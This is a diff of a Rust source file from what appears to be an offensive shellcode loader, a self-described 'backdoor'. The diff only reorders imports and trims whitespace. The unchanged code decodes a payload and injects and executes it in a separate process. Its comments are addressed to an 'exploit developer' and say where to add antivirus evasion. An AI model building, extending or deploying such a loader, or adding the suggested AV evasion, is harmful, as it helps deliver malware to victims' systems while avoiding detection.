@@ -1,6 +1,6 @@
-use std::{env, io, mem, ptr};
 use std::error::Error;
-use std::process::{Command, Child};
+use std::process::{Child, Command};
+use std::{env, io, mem, ptr};
 
 use crate::setting::Setting;
 
@@ -8,7 +8,7 @@ use memmap::MmapMut;
 
 /// Call the backdoor in a new process with the argument
 /// to execute the payload.
-/// 
+///
 /// This may seem like a workaround and it is. Execute the payload
 /// in the main process could - most of the shellcodes - lead to premature
 /// exit. In order to avoid that to happen, always execute the payload inside
@@ -21,17 +21,17 @@ pub fn from_process() -> io::Result<Child> {
 
 /// This function is called in a new process and it is intended to never
 /// continue execution.
-/// 
+///
 /// Note dear exploit developer,
 ///
-/// At the very first line of this function, when the payload is decoded, 
+/// At the very first line of this function, when the payload is decoded,
 /// known malicious payloads might get detected by AVs. Luckly, this
 /// is not always executed.
 ///
 /// If you want advanced AV evasion, you should change here.
 pub fn execute(setting: &Setting) -> Result<(), Box<dyn Error>> {
     let raw_payload = setting.decode_payload()?;
-    
+
     println!("INFO: inject execute procedure");
     inject_exec(&raw_payload);
 
